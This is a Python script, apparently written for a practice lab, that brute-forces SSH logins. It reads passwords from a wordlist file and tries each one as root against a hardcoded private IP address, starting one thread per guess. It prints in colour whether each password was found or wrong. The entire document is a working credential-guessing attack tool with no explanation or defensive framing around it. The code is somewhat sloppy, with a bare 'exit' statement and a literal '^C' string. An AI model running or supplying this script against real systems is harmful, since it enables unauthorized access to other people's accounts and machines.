#!/bin/python3

import pexpect
from termcolor import colored
import threading


PROMPT=['#','>>>','>','\$']#'`$','$',':~$','root@10.10.135.155']

def connect(user,host,password):
    ssh_newkey='Are you sure you want to continue connecting'
    connstr='ssh '+user+'@'+host
    child=pexpect.spawn(connstr)
    ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[p|P]assword'])
 #   print(ret)
    if ret==0:
        print('[-] Error')
        return
    if ret==1:
        child.sendline('yes')
        ret=child.expect([pexpect.TIMEOUT,'[p|P]assword'])
        if ret==0:
            print('[-] Error')
            return
        try:
            child.sendline(password)
            child.expect(PROMPT)
        except Exception as e:
            print(e)
            exit()
      #  print(child)
        return child
    if ret==2:
        try:
            child.sendline(password)
            child.sendline('^C')
            child.expect(PROMPT,timeout=0.5)
            print(colored('[+] Passsword found ' + password,'green'))
            exit
        except:
            print(colored('[-] wrong Password '+ password,'red'))
	        






def main():
  #  host=input('Enter the host ip > ')
  #  user=input('Enter the user name of host > ')
    filew=input('Enter the file location > ')
    fl=open(filew,'r')
    for password in fl.readlines():
      password=password.strip('\n')
      try:
          t=threading.Thread(target=connect,args=('root','10.10.135.155',password))
          t.start()
      except Exception as e:
          pass
         
   # child=connect(user,host,password)
 
main()
